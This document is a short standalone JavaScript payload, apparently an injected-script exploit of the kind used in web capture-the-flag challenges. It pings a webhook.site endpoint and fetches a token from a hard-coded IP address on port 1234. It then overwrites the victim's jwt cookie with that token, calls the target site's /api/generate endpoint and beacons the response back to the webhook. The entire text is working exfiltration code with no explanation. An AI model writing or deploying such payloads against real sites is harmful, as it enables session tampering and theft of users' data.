navigator.sendBeacon('//webhook.site/49d5c423-d0fa-4795-8b37-0d2d38a020c0/?0');

document.cookie='jwt=';
fetch('//23.94.107.138:1234/').then((r)=>{r.text().then( async (r)=> {
    document.cookie = `jwt=${r.replace('\r', '').replace('\n', '')}; path=/`;
    fetch('/api/generate').then((r)=>{r.text().then((r)=>{
        navigator.sendBeacon('//webhook.site/49d5c423-d0fa-4795-8b37-0d2d38a020c0/?success', r);
    }).catch((r)=>{
        navigator.sendBeacon('//webhook.site/49d5c423-d0fa-4795-8b37-0d2d38a020c0/?success', r);
    })});
})});
